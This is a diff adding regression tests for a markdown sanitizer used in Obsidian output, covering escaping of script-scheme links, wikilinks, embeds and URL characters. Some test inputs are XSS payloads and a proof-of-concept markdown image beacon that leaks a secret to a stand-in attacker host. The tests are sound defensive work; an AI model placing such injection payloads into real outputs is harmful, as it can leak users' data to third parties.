@@ -5,7 +5,7 @@
  * 【Code Review P1】: XSS対策 - Markdownリンクのサニタイズ
  */
 
-import { sanitizeMarkdownLinks, sanitizeAllMarkdownLinks, sanitizeForObsidian } from '../markdownSanitizer.js';
+import { sanitizeMarkdownLinks, sanitizeAllMarkdownLinks, sanitizeForObsidian, escapeObsidianWikilinks, sanitizeUrlForMarkdownTarget } from '../markdownSanitizer.js';
 
 describe('markdownSanitizer', () => {
     describe('sanitizeMarkdownLinks', () => {
@@ -127,6 +127,122 @@ describe('markdownSanitizer', () => {
 
         it('should handle non-string input', () => {
             expect(sanitizeForObsidian(99 as any)).toBe(99);
+        });
+
+        // VULN-002/005 regression tests
+        it('should escape javascript: scheme links (VULN-002)', () => {
+            const input = '[Click here](javascript:alert(document.domain))';
+            const result = sanitizeForObsidian(input);
+            expect(result).toContain('\\[Click here\\]');
+            expect(result).not.toMatch(/\[Click here\]\(javascript:/);
+        });
+
+        it('should escape data: scheme links', () => {
+            const input = '[evil](data:text/html,<script>alert(1)</script>)';
+            const result = sanitizeForObsidian(input);
+            expect(result).toContain('\\[evil\\]');
+        });
+
+        it('should escape Obsidian wikilink syntax [[...]]', () => {
+            const input = 'See [[Private Note]] for details';
+            const result = sanitizeForObsidian(input);
+            expect(result).toContain('\\[\\[Private Note\\]\\]');
+            expect(result).not.toMatch(/\[\[Private Note\]\]/);
+        });
+
+        it('should escape Obsidian embed syntax ![[...]]', () => {
+            const input = 'Embedded: ![[Secret Document]]';
+            const result = sanitizeForObsidian(input);
+            expect(result).toContain('!\\[\\[Secret Document\\]\\]');
+            expect(result).not.toMatch(/!\[\[Secret Document\]\]/);
+        });
+
+        it('should escape both markdown links and wikilinks in same input', () => {
+            const input = 'Click [here](https://evil.com) or see [[Passwords]]';
+            const result = sanitizeForObsidian(input);
+            expect(result).toContain('\\[here\\]');
+            expect(result).toContain('\\[\\[Passwords\\]\\]');
+        });
+    });
+
+    describe('escapeObsidianWikilinks', () => {
+        it('should escape [[wikilink]] pattern', () => {
+            expect(escapeObsidianWikilinks('See [[Note]]')).toBe('See \\[\\[Note\\]\\]');
+        });
+
+        it('should escape ![[embed]] pattern', () => {
+            expect(escapeObsidianWikilinks('See ![[Note]]')).toBe('See !\\[\\[Note\\]\\]');
+        });
+
+        it('should handle multiple wikilinks', () => {
+            const input = '[[A]] and [[B]]';
+            expect(escapeObsidianWikilinks(input)).toBe('\\[\\[A\\]\\] and \\[\\[B\\]\\]');
+        });
+
+        it('should return empty string for empty input', () => {
+            expect(escapeObsidianWikilinks('')).toBe('');
+        });
+
+        it('should handle null input', () => {
+            expect(escapeObsidianWikilinks(null as any)).toBeNull();
+        });
+
+        it('should handle undefined input', () => {
+            expect(escapeObsidianWikilinks(undefined as any)).toBeUndefined();
+        });
+
+        it('should not modify text without wikilinks', () => {
+            const input = 'Normal text without wikilinks';
+            expect(escapeObsidianWikilinks(input)).toBe(input);
+        });
+    });
+
+    describe('sanitizeUrlForMarkdownTarget', () => {
+        it('should encode parentheses', () => {
+            const input = 'https://evil.tld/x)![beacon](https://evil.tld/exfil.png';
+            const result = sanitizeUrlForMarkdownTarget(input);
+            expect(result).not.toContain(')');
+            expect(result).not.toContain('(');
+            expect(result).toContain('%29');
+            expect(result).toContain('%28');
+        });
+
+        it('should encode square brackets', () => {
+            const input = 'https://evil.tld/path[test]';
+            const result = sanitizeUrlForMarkdownTarget(input);
+            expect(result).not.toContain('[');
+            expect(result).not.toContain(']');
+            expect(result).toContain('%5B');
+            expect(result).toContain('%5D');
+        });
+
+        it('should encode exclamation marks', () => {
+            const input = 'https://evil.tld/!inject';
+            const result = sanitizeUrlForMarkdownTarget(input);
+            expect(result).not.toContain('!');
+            expect(result).toContain('%21');
+        });
+
+        it('should preserve normal URL characters', () => {
+            const input = 'https://example.com/path?q=hello&lang=en#section';
+            expect(sanitizeUrlForMarkdownTarget(input)).toBe(input);
+        });
+
+        it('should handle empty string', () => {
+            expect(sanitizeUrlForMarkdownTarget('')).toBe('');
+        });
+
+        it('should handle null input', () => {
+            expect(sanitizeUrlForMarkdownTarget(null as any)).toBeNull();
+        });
+
+        it('should handle VULN-001 PoC payload', () => {
+            const input = 'https://evil.tld/x)%20![beacon](https://evil.tld/exfil.png?leak=SECRET';
+            const result = sanitizeUrlForMarkdownTarget(input);
+            // After encoding, the result should not break out of markdown link syntax
+            expect(result).not.toContain(')');
+            expect(result).not.toContain('!');
+            expect(result).not.toContain('[');
         });
     });
 });
